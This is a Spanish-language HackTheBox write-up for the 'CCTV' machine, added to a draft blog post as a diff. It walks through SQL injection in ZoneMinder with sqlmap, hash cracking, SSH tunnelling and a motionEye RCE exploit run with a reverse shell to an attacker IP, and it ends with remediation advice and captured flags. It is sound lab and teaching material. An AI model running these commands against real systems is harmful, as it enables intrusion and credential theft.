@@ -13,6 +13,546 @@ language: 'Spanish'
 draft: true
 ---
 
+
+# Informe Técnico de Pentesting
+## Máquina Objetivo: CCTV (HackTheBox)
+
+---
+
+## 1. Información General
+
+| Campo | Detalle |
+|-------|---------|
+| **Objetivo** | CCTV (HackTheBox) |
+| **Tipo de evaluación** | Prueba de penetración (Pentesting) - CTF |
+| **Alcance** | Compromiso completo del sistema (user.txt + root.txt) |
+| **Metodología** | Reconocimiento, enumeración web, explotación de SQLi, escalada de privilegios local, pivoting |
+
+---
+
+## 2. Resumen Ejecutivo
+
+Este informe documenta el proceso completo de evaluación de seguridad realizado sobre la máquina **CCTV** de HackTheBox. La máquina presenta un entorno de videovigilancia basado en **ZoneMinder** y **motionEye** con múltiples vectores de ataque encadenados.
+
+**Flujo de compromiso:**
+1. **Foothold:** SQL Injection en ZoneMinder → extracción de hashes bcrypt → cracking con hashcat → acceso SSH como `mark`
+2. **User Pivot:** Local Port Forwarding → descubrimiento de motionEye en localhost:8765
+3. **Privilege Escalation:** RCE autenticado en motionEye 0.43.1b4 (CVE-2025-60787) → shell como root
+
+**Hallazgos críticos:** Credenciales por defecto, SQL Injection sin autenticación, servicios internos expuestos sin segmentación, y RCE en software de videovigilancia.
+
+---
+
+## 3. Fase de Reconocimiento
+
+### 3.1 Descubrimiento de Puertos
+
+Se realizó un escaneo completo de puertos con Nmap para identificar la superficie de ataque inicial.
+
+**Comando ejecutado:**
+```bash
+sudo nmap -p- -sS --min-rate=5000 -vvv -n -Pn 10.129.15.205 -oG allPorts
+```
+
+**Resultados:**
+
+| Puerto | Estado | Servicio | Versión |
+|--------|--------|----------|---------|
+| 22/tcp | Abierto | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
+| 80/tcp | Abierto | HTTP | Apache httpd 2.4.58 |
+
+> ![](Pasted_image_20260322124643.png)
+
+**Escaneo de servicios y versiones:**
+```bash
+sudo nmap -p22,80 -sCV 10.129.15.205 -oN targeted
+```
+
+> ![](Pasted_image_20260322124712.png)
+
+### 3.2 Configuración de DNS Local
+
+Dado que el servidor web redirige a `http://cctv.htb/`, se añadió la entrada correspondiente al archivo `/etc/hosts`:
+
+```bash
+echo "10.129.15.205 cctv.htb" | sudo tee -a /etc/hosts
+```
+
+> ![](Pasted_image_20260322124756.png)
+
+### 3.3 Enumeración Web
+
+Al acceder a `http://cctv.htb` se identificó un sitio corporativo de **SecureVision CCTV & Security Solutions**.
+
+> ![](Pasted_image_20260322124908.png)
+
+Análisis del código fuente reveló:
+- El botón "Get a Quote" redirige a `mailto:info@securevision.com` (sin funcionalidad vulnerable)
+- Enlace a **Staff Login** en la esquina superior derecha
+
+> ![](Pasted_image_20260322124941.png)
+
+---
+
+## 4. Fase de Explotación - Foothold
+
+### 4.1 Acceso al Panel ZoneMinder
+
+La ruta `/zm` redirige al panel de login de **ZoneMinder**, un software de código abierto para videovigilancia CCTV.
+
+> ![](Pasted_image_20260322125324.png)
+
+**Investigación de vulnerabilidades conocidas:**
+```bash
+searchsploit zoneminder
+```
+
+> ![](Pasted_image_20260322125415.png)
+
+**Hallazgo:** ZoneMinder utiliza credenciales por defecto `admin:admin` según su documentación oficial.
+
+> ![](Pasted_image_20260322125548.png)
+
+**Acceso exitoso:**
+
+> ![](Pasted_image_20260322125622.png)
+> ![](Pasted_image_20260322125633.png)
+
+**Versión identificada:** ZoneMinder v1.37.63
+
+### 4.2 CVE-2024-51482 - Boolean-based SQL Injection
+
+Se identificó una vulnerabilidad de SQL Injection en la función `web/ajax/event.php` del archivo `removetag`:
+
+> ![](Pasted_image_20260322131331.png)
+
+**Prueba inicial con PoC (fallida):**
+```bash
+git clone https://github.com/BridgerAlderson/CVE-2024-51482.git
+python3 CVE-2024-51482.py -t 10.129.15.205 -u admin -p admin --test
+# Resultado: Target does not appear vulnerable
+```
+
+> ![](Pasted_image_20260322131400.png)
+> ![](Pasted_image_20260322131413.png)
+
+### 4.3 Explotación con sqlmap - Time-based Blind SQL Injection
+
+Tras investigar la advisoria oficial de GitHub Security Advisory (GHSA-qm8h-3xvf-m7j3), se confirmó que la versión v1.37.63 es vulnerable a **boolean-based SQL Injection** en `web/ajax/event.php`:
+
+> ![](Pasted_image_20260322134704.png)
+
+**Explotación con sqlmap:**
+
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1'   --cookie="ZMSESSID=5c347ng97vsv7cn75a031fojm2"   --batch --current-db --current-user
+```
+
+**Resultados:**
+- **Tipo de inyección:** Time-based blind (query SLEEP)
+- **DBMS:** MySQL >= 5.0.12
+- **Usuario actual:** zmuser@localhost
+- **Base de datos actual:** `zm`
+
+> ![](Pasted_image_20260322132803.png)
+
+**Verificación de privilegios DBA:**
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1'   --cookie="ZMSESSID=..." --batch --is-dba
+```
+- **current user is DBA: False**
+
+> ![](Pasted_image_20260322133549.png)
+
+### 4.4 Extracción de Datos - Tabla Users
+
+**Enumeración de tablas:**
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1'   --cookie="ZMSESSID=..." --tables -D "zm"
+```
+
+> ![](Pasted_image_20260323171753.png)
+
+**Enumeración de columnas:**
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1'   --cookie="ZMSESSID=..." -T "Users" -D "zm" --columns
+```
+
+> ![](Pasted_image_20260323171910.png)
+
+**Extracción de credenciales:**
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1'   --cookie="ZMSESSID=..." -D "zm" -T "Users" -C "Username,Password,Email" --dump
+```
+
+**Resultados obtenidos:**
+
+| Username | Password (Hash bcrypt) |
+|----------|------------------------|
+| superadmin | $2y$10$cmytVWFRnt1XfqsItsJR... |
+| mark | $2y$10$prZGnazejKcuTv5bKNexX... |
+| admin | $2y$10$t5z8uIT... |
+
+> ![](Pasted_image_20260324162904.png)
+> ![](Pasted_image_20260323172704.png)
+> ![](Pasted_image_20260323172712.png)
+
+### 4.5 Cracking de Hashes bcrypt
+
+**Identificación del algoritmo:**
+```bash
+hashid '$2y$10$cmytVWFRnt1XfqsItsJR...'
+# Resultado: bcrypt
+```
+
+> ![](Pasted_image_20260323172712.png)
+> ![](Pasted_image_20260324140219.png)
+
+**Cracking con hashcat (modo 3200 - bcrypt):**
+```bash
+hashcat -m 3200 hash_mark.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Resultado:**
+- Hash de **mark**: `opensesame`
+
+> ![](Pasted_image_20260324161408.png)
+> ![](Pasted_image_20260324161426.png)
+> ![](Pasted_image_20260324161523.png)
+
+### 4.6 Acceso SSH como mark
+
+```bash
+ssh mark@cctv.htb
+# Password: opensesame
+```
+
+> ![](Pasted_image_20260324161523.png)
+
+---
+
+## 5. Fase de Post-Explotación - User Pivot
+
+### 5.1 Enumeración Interna
+
+Revisión del home del usuario `mark`:
+
+> ![](Pasted_image_20260324161826.png)
+
+Enumeración de usuarios del sistema:
+```bash
+cat /etc/passwd | grep -ie "fi"
+```
+
+**Usuarios identificados:**
+- `mark:x:1000:1000:mark:/home/mark:/bin/bash`
+- `sa_mark:x:1001:1001::/home/sa_mark:/bin/sh`
+
+> ![](Pasted_image_20260324161748.png)
+
+Acceso denegado al home de `sa_mark`:
+
+> ![](Pasted_image_20260324161940.png)
+
+### 5.2 Enumeración de Puertos Locales
+
+```bash
+ss -tulpn | awk '{print $5}' | sort -u
+```
+
+**Servicios internos identificados:**
+
+| Puerto | Servicio | Descripción |
+|--------|----------|-------------|
+| 127.0.0.1:1935 | RTMP | Real-Time Messaging Protocol (streaming) |
+| 127.0.0.1:3306 | MySQL | Base de datos ZoneMinder |
+| 127.0.0.1:33060 | MySQL X DevAPI | API moderna de MySQL |
+| 127.0.0.1:7999 | WebControl | Panel de control motionEye |
+| 127.0.0.1:8554 | RTSP | Real Time Streaming Protocol |
+| 127.0.0.1:8765 | motionEye | Interfaz web de videovigilancia |
+| 127.0.0.1:8888 | Servicio custom | Posible Jupyter/proxy |
+| 127.0.0.1:9081 | Servicio custom | Posible WebSphere/microservicio |
+
+> ![](Pasted_image_20260324171637.png)
+
+### 5.3 Local Port Forwarding vía SSH
+
+Para acceder a los servicios internos, se estableció un túnel SSH desde la máquina atacante:
+
+> **Nota:** El comando se ejecuta en la máquina atacante, NO en la sesión SSH de mark.
+
+```bash
+# Prueba de puertos mediante túneles individuales
+ssh -L 9999:127.0.0.1:1935 mark@cctv.htb    # RTMP - Sin respuesta web
+ssh -L 9999:127.0.0.1:7999 mark@cctv.htb    # WebControl - "Motion 4.7.1 Running"
+ssh -L 9999:127.0.0.1:8554 mark@cctv.htb    # RTSP - Sin respuesta
+ssh -L 9999:127.0.0.1:8765 mark@cctv.htb    # motionEye - Panel de login identificado
+```
+
+> ![](Pasted_image_20260324172056.png)
+> ![](Pasted_image_20260324172103.png)
+> ![](Pasted_image_20260324172156.png)
+> ![](Pasted_image_20260324172232.png)
+> ![](Pasted_image_20260324172629.png)
+> ![](Pasted_image_20260324172731.png)
+> ![](Pasted_image_20260324172804.png)
+> ![](Pasted_image_20260324172817.png)
+
+**Servicio objetivo identificado:** motionEye en `localhost:8765` (tuneleado a `localhost:9999`)
+
+---
+
+## 6. Fase de Explotación - Privilege Escalation
+
+### 6.1 Acceso al Panel motionEye
+
+Se encontró el panel de login de **motionEye**:
+
+> ![](Pasted_image_20260324172817.png)
+
+**Búsqueda de credenciales en archivos de configuración:**
+```bash
+cd /etc/motioneye
+cat motion.conf
+```
+
+**Credenciales encontradas en texto plano:**
+```
+# @admin_username admin
+# @normal_username user
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+# @lang en
+# @enabled on
+# @normal_password
+
+webcontrol_port 7999
+webcontrol_interface 1
+webcontrol_localhost on
+webcontrol_parms 2
+```
+
+> ![](Pasted_image_20260324174208.png)
+
+**Acceso exitoso con credenciales:** `admin:989c5a8ee87a0e9521ec81a79187d162109282f0`
+
+> ![](Pasted_image_20260324174347.png)
+
+### 6.2 Identificación de Versión Vulnerable
+
+En la sección de preferencias del panel:
+- **motionEye Version:** 0.43.1b4
+- **Motion Version:** 4.7.1
+- **OS Version:** Ubuntu 24.04
+
+> ![](Pasted_image_20260324174737.png)
+
+### 6.3 CVE-2025-60787 - Authenticated RCE en motionEye
+
+**Búsqueda de exploits:**
+```bash
+searchsploit motionEye
+# Resultado: motionEye 0.43.1b4 - RCE (multiple/webapps/52481.txt)
+```
+
+> ![](Pasted_image_20260324174909.png)
+> ![](Pasted_image_20260324175212.png)
+
+**Repositorio del PoC automatizado:**
+```bash
+git clone https://github.com/gunzf0x/CVE-2025-60787.git
+```
+
+> ![](Pasted_image_20260324175706.png)
+
+**Ejecución del exploit:**
+```bash
+cd CVE-2025-60787
+python3 CVE-2025-60787.py revshell   --url 'http://127.0.0.1:9999'   --user 'admin'   --password '989c5a8ee87a0e9521ec81a79187d162109282f0'   -i 10.10.14.15 --port 4444
+```
+
+**Resultado:**
+```
+[*] Attempting to connect to 'http://127.0.0.1:9999' with credentials 'admin:989c5a8ee87a0e9521ec81a79187d162109282f0'
+[*] Valid credentials provided
+[*] Obtaining cameras available
+[*] Found 1 camera(s)
+    1) Name: 'CAM 01' ; ID: 1; root_directory: '/var/lib/motioneye/Camera1'
+[*] Using camera by default (first one found) for the exploit
+[*] Payload successfully injected. Check your shell...
+~Happy Hacking
+```
+
+> ![](Pasted_image_20260324175913.png)
+> ![](Pasted_image_20260324175930.png)
+> ![](Pasted_image_20260324175939.png)
+
+### 6.4 Shell como Root y Captura de Flags
+
+```bash
+# Listener en atacante
+penelope -p 4444
+
+# Shell obtenida como root
+root@cctv:/etc/motioneye# whoami
+root
+```
+
+**Captura de user.txt:**
+```bash
+cd /home/sa_mark
+cat user.txt
+# 7534ee3581d09897c1766de14fe7217a
+```
+
+**Captura de root.txt:**
+```bash
+cd /root
+cat root.txt
+# 1da83d0abfcbac63ae7e5ecc7fe4ca34
+```
+
+> ![](Pasted_image_20260324180042.png)
+
+---
+
+## 7. Métricas de Severidad
+
+```
+CRÍTICA:  4 (SQL Injection → RCE en motionEye → Root)
+ALTA:     2 (Credenciales por defecto ZoneMinder, credenciales en texto plano motionEye)
+MEDIA:    2 (Servicios internos sin segmentación, Local Port Forwarding posible)
+BAJA:     1 (Información de versiones expuesta)
+```
+
+---
+
+## 8. Recomendaciones
+
+### Inmediatas (Prioridad Alta)
+1. **Actualizar ZoneMinder** a versión >= 1.37.65 (parchea CVE-2024-51482)
+2. **Actualizar motionEye** a versión > 0.43.1b4 (parchea CVE-2025-60787)
+3. **Cambiar credenciales por defecto** en ZoneMinder (admin:admin)
+4. **Eliminar contraseñas en texto plano** de archivos de configuración motionEye
+5. **Implementar segmentación de red** - motionEye no debe estar accesible solo vía localhost sin autenticación robusta
+
+### A Medio Plazo
+6. **Habilitar WAF** para proteger endpoints vulnerables de ZoneMinder
+7. **Implementar logging y monitorización** de accesos a bases de datos
+8. **Usar hashes fuertes** y rotación de credenciales periódica
+9. **Restringir acceso SSH** a IPs autorizadas únicamente
+
+---
+
+## 9. Conclusiones
+
+La máquina **CCTV** demuestra cómo vulnerabilidades aparentemente menores pueden encadenarse para lograr un compromiso total:
+
+1. **SQL Injection en ZoneMinder** permitió la extracción de hashes de usuarios del sistema
+2. **Cracking de bcrypt** (aunque lento) fue viable gracias a contraseñas débiles en el diccionario
+3. **Servicios internos expuestos** (motionEye) sin segmentación adecuada permitieron el pivoting
+4. **RCE autenticado en motionEye** proporcionó acceso root directo
+
+La cadena de ataque completa evidencia la importancia de:
+- **Parcheo oportuno** de software de terceros
+- **No almacenar credenciales en texto plano**
+- **Segmentación de red** para servicios administrativos internos
+- **Contraseñas robustas** que resistan ataques de diccionario incluso con bcrypt
+
+---
+
+## 10. Anexos
+
+### Anexo A: Referencias de Imágenes
+
+| Referencia | Descripción |
+|------------|-------------|
+| `Pasted_image_20260322124643.png` | Escaneo Nmap allPorts (puertos 22, 80) |
+| `Pasted_image_20260322124712.png` | Escaneo Nmap targeted (versiones de servicios) |
+| `Pasted_image_20260322124756.png` | Configuración /etc/hosts para cctv.htb |
+| `Pasted_image_20260322124908.png` | Página principal SecureVision |
+| `Pasted_image_20260322124941.png` | Código fuente de la web principal |
+| `Pasted_image_20260322125324.png` | Panel de login ZoneMinder |
+| `Pasted_image_20260322125415.png` | Resultados searchsploit zoneminder |
+| `Pasted_image_20260322125548.png` | Documentación credenciales por defecto ZoneMinder |
+| `Pasted_image_20260322125622.png` | Login ZoneMinder con admin:admin |
+| `Pasted_image_20260322125633.png` | Dashboard ZoneMinder v1.37.63 |
+| `Pasted_image_20260322131331.png` | Repositorio CVE-2024-51482 |
+| `Pasted_image_20260322131400.png` | Clonación del exploit CVE-2024-51482 |
+| `Pasted_image_20260322131413.png` | Prueba fallida del exploit CVE-2024-51482 |
+| `Pasted_image_20260322132803.png` | sqlmap - identificación de time-based blind SQLi |
+| `Pasted_image_20260322133549.png` | sqlmap - verificación DBA false |
+| `Pasted_image_20260322134704.png` | GitHub Advisory GHSA-qm8h-3xvf-m7j3 |
+| `Pasted_image_20260323171753.png` | sqlmap - enumeración de tablas |
+| `Pasted_image_20260323171910.png` | sqlmap - enumeración de columnas Users |
+| `Pasted_image_20260323172704.png` | Identificación hash bcrypt vía Google |
+| `Pasted_image_20260323172712.png` | hashid - identificación algoritmo |
+| `Pasted_image_20260324140219.png` | hashid - resultado bcrypt |
+| `Pasted_image_20260324161408.png` | hashcat - cracking en progreso |
+| `Pasted_image_20260324161426.png` | hashcat - inicio de sesión |
+| `Pasted_image_20260324161523.png` | hashcat - contraseña crackeada: opensesame |
+| `Pasted_image_20260324161748.png` | /etc/passwd - usuarios mark y sa_mark |
+| `Pasted_image_20260324161826.png` | Home del usuario mark |
+| `Pasted_image_20260324161940.png` | Acceso denegado a /home/sa_mark |
+| `Pasted_image_20260324162904.png` | sqlmap - dump de tabla Users |
+| `Pasted_image_20260324171637.png` | ss -tulpn - puertos locales abiertos |
+| `Pasted_image_20260324172056.png` | SSH tunnel puerto 1935 (RTMP) |
+| `Pasted_image_20260324172103.png` | localhost:9999 - RTMP sin respuesta |
+| `Pasted_image_20260324172156.png` | SSH tunnel puerto 7999 (WebControl) |
+| `Pasted_image_20260324172232.png` | localhost:9999 - Motion 4.7.1 Running |
+| `Pasted_image_20260324172629.png` | SSH tunnel puerto 8554 (RTSP) |
+| `Pasted_image_20260324172731.png` | localhost:9999 - RTSP sin respuesta |
+| `Pasted_image_20260324172804.png` | SSH tunnel puerto 8765 (motionEye) |
+| `Pasted_image_20260324172817.png` | localhost:9999 - Panel login motionEye |
+| `Pasted_image_20260324174208.png` | /etc/motioneye/motion.conf - credenciales en texto plano |
+| `Pasted_image_20260324174347.png` | Panel motionEye autenticado |
+| `Pasted_image_20260324174737.png` | motionEye version 0.43.1b4 identificada |
+| `Pasted_image_20260324174909.png` | Búsqueda motioneye exploit en Google |
+| `Pasted_image_20260324175212.png` | searchsploit motionEye 0.43.1b4 RCE |
+| `Pasted_image_20260324175706.png` | Repositorio CVE-2025-60787 |
+| `Pasted_image_20260324175913.png` | Clonación del exploit CVE-2025-60787 |
+| `Pasted_image_20260324175930.png` | Ejecución exitosa del exploit |
+| `Pasted_image_20260324175939.png` | Reverse shell recibida en penelope |
+| `Pasted_image_20260324180042.png` | Captura de user.txt y root.txt |
+
+### Anexo B: Herramientas Utilizadas
+
+- Nmap (reconocimiento de puertos)
+- sqlmap (explotación SQL Injection)
+- hashid / hashcat (identificación y cracking de hashes)
+- searchsploit / Exploit-DB (búsqueda de vulnerabilidades)
+- SSH con Local Port Forwarding (pivoting)
+- penelope (handler de reverse shells)
+- GitHub (obtención de PoCs)
+
+### Anexo C: Recursos Externos
+
+- [CVE-2024-51482 - ZoneMinder Blind SQL Injection](https://github.com/BridgerAlderson/CVE-2024-51482)
+- [GHSA-qm8h-3xvf-m7j3 - GitHub Security Advisory](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)
+- [CVE-2025-60787 - motionEye Authenticated RCE](https://github.com/gunzf0x/CVE-2025-60787)
+- [Exploit-DB 52481 - motionEye RCE](https://www.exploit-db.com/exploits/52481)
+
+---
+
+*Informe generado para fines educativos y documentación técnica en entornos de laboratorio controlados (HackTheBox).*
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 #
 ##
 
